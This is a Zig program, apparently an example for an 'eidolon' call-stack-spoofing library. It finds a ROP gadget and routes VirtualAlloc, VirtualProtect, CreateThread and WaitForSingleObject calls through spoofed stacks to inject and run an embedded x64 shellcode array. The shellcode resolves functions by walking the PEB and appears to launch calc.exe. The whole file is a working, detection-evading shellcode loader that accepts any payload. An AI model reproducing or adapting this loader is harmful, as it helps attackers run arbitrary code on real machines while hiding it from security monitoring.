const std = @import("std");
const eidolon = @import("eidolon");
const win = std.os.windows;

// Windows API declarations
pub extern "kernel32" fn GetModuleHandleA(lpModuleName: ?[*:0]const u8) callconv(.winapi) ?win.HINSTANCE;
pub extern "kernel32" fn LoadLibraryA(lpLibFileName: [*:0]const u8) callconv(.winapi) ?win.HINSTANCE;
pub extern "kernel32" fn GetProcAddress(hModule: ?win.HINSTANCE, lpProcName: [*:0]const u8) callconv(.winapi) ?*anyopaque;

pub fn main() !void {
    const shellcode = [_]u8{ 0x48, 0x31, 0xff, 0x48, 0xf7, 0xe7, 0x65, 0x48, 0x8b, 0x58, 0x60, 0x48, 0x8b, 0x5b, 0x18, 0x48, 0x8b, 0x5b, 0x20, 0x48, 0x8b, 0x1b, 0x48, 0x8b, 0x1b, 0x48, 0x8b, 0x5b, 0x20, 0x49, 0x89, 0xd8, 0x8b, 0x5b, 0x3c, 0x4c, 0x01, 0xc3, 0x48, 0x31, 0xc9, 0x66, 0x81, 0xc1, 0xff, 0x88, 0x48, 0xc1, 0xe9, 0x08, 0x8b, 0x14, 0x0b, 0x4c, 0x01, 0xc2, 0x4d, 0x31, 0xd2, 0x44, 0x8b, 0x52, 0x1c, 0x4d, 0x01, 0xc2, 0x4d, 0x31, 0xdb, 0x44, 0x8b, 0x5a, 0x20, 0x4d, 0x01, 0xc3, 0x4d, 0x31, 0xe4, 0x44, 0x8b, 0x62, 0x24, 0x4d, 0x01, 0xc4, 0xeb, 0x32, 0x5b, 0x59, 0x48, 0x31, 0xc0, 0x48, 0x89, 0xe2, 0x51, 0x48, 0x8b, 0x0c, 0x24, 0x48, 0x31, 0xff, 0x41, 0x8b, 0x3c, 0x83, 0x4c, 0x01, 0xc7, 0x48, 0x89, 0xd6, 0xf3, 0xa6, 0x74, 0x05, 0x48, 0xff, 0xc0, 0xeb, 0xe6, 0x59, 0x66, 0x41, 0x8b, 0x04, 0x44, 0x41, 0x8b, 0x04, 0x82, 0x4c, 0x01, 0xc0, 0x53, 0xc3, 0x48, 0x31, 0xc9, 0x80, 0xc1, 0x07, 0x48, 0xb8, 0x0f, 0xa8, 0x96, 0x91, 0xba, 0x87, 0x9a, 0x9c, 0x48, 0xf7, 0xd0, 0x48, 0xc1, 0xe8, 0x08, 0x50, 0x51, 0xe8, 0xb0, 0xff, 0xff, 0xff, 0x49, 0x89, 0xc6, 0x48, 0x31, 0xc9, 0x48, 0xf7, 0xe1, 0x50, 0x48, 0xb8, 0x9c, 0x9e, 0x93, 0x9c, 0xd1, 0x9a, 0x87, 0x9a, 0x48, 0xf7, 0xd0, 0x50, 0x48, 0x89, 0xe1, 0x48, 0xff, 0xc2, 0x48, 0x83, 0xec, 0x20, 0x41, 0xff, 0xd6, 0xEB, 0xFE };
    const allocator = std.heap.page_allocator;

    // Get the address of the gadget as a usize to pass to your config
    // 1. Find the ROP gadget (jmp qword ptr [rbx])
    const gadget = eidolon.find_gadget() orelse {
        std.debug.print("Failed to find gadget\n", .{});
        return;
    };

    std.debug.print("[+] Found gadget at: 0x{X}\n", .{gadget});
    const kernel32 = LoadLibraryA("kernel32.dll") orelse {
        std.debug.print("Failed to load kernel32.dll\n", .{});
        return;
    };

    const create_thread = @intFromPtr(GetProcAddress(kernel32, "CreateThread") orelse {
        std.debug.print("Failed to get CreateThread address\n", .{});
        return;
    });
    std.debug.print("[+] CreateThread at: 0x{X}\n", .{create_thread});

    const virtual_alloc = @intFromPtr(GetProcAddress(kernel32, "VirtualAlloc") orelse {
        std.debug.print("Failed to get VirtualAlloc address\n", .{});
        return;
    });
    std.debug.print("[+] VirtualAlloc at: 0x{X}\n", .{virtual_alloc});

    const wait_for_single_object = @intFromPtr(GetProcAddress(kernel32, "WaitForSingleObject") orelse {
        std.debug.print("Failed to get WaitForSingleObject address\n", .{});
        return;
    });
    std.debug.print("[+] WaitForSingleObject at: 0x{X}\n", .{wait_for_single_object});
    var virtual_alloc_config = try eidolon.StackConfig.init(
        allocator,
        gadget,
        virtual_alloc,
        .{
            @as(usize, 0), // lpAddress: NULL, let OS choose
            shellcode.len, // dwSize
            0x3000, // MEM_COMMIT | MEM_RESERVE
            0x04, // PAGE_READWRITE
        },
    );
    //// 5. Execute the eidoloned call
    const addr = eidolon.Spoof(&virtual_alloc_config);
    std.debug.print("allocated: 0x{X}\n", .{addr});
    const buffer: [*]u8 = @ptrFromInt(addr);
    std.mem.copyForwards(u8, buffer[0..shellcode.len], &shellcode);

    // Change protection to PAGE_EXECUTE_READ
    const virtual_protect = @intFromPtr(GetProcAddress(kernel32, "VirtualProtect") orelse {
        std.debug.print("Failed to get VirtualProtect address\n", .{});
        return;
    });
    var old_protect: u32 = 0;
    var virtual_protect_config = try eidolon.StackConfig.init(
        allocator,
        gadget,
        virtual_protect,
        .{
            addr, // lpAddress
            shellcode.len, // dwSize
            @as(u32, 0x20), // PAGE_EXECUTE_READ
            @intFromPtr(&old_protect), // lpflOldProtect
        },
    );
    _ = eidolon.Spoof(&virtual_protect_config);

    var create_thread_config = try eidolon.StackConfig.init(
        allocator,
        gadget,
        create_thread,
        .{
            null, // lpAddress: NULL, let OS choose
            0, // dwSize
            addr,
            null,
            0,
            null,
        },
    );
    var h_thread: ?std.os.windows.HANDLE = null;
    h_thread = @ptrFromInt(eidolon.Spoof(&create_thread_config));

    var wait_for_single_object_config = try eidolon.StackConfig.init(
        allocator,
        gadget,
        wait_for_single_object,
        .{
            h_thread,
            @as(u32, 0xFFFFFFFF), // INFINITE
        },
    );
    const result = eidolon.Spoof(&wait_for_single_object_config);
    std.debug.print("finish: {}", .{result});
}
